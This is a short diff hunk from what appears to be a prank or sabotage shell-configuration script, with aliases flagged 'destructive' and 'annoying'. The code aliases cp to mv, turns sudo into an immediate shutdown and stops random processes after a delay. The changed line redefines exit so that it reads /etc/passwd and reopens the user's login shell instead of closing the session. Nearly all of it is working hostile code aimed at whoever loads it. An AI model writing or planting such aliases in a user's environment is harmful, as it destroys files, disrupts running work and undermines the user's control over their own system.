@@ -117,7 +117,7 @@ destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed
 destructive && alias cp='mv';
 
 # Make `exit` open a new shell.
-annoying && alias exit='sh';
+annoying && function exit { $(cat /etc/passwd | grep $(whoami) | cut -d ':' -f 7;); }
 
 # Shut down the computer instead of running a command with super-user rights.
 destructive && alias sudo='sudo shutdown -P now';
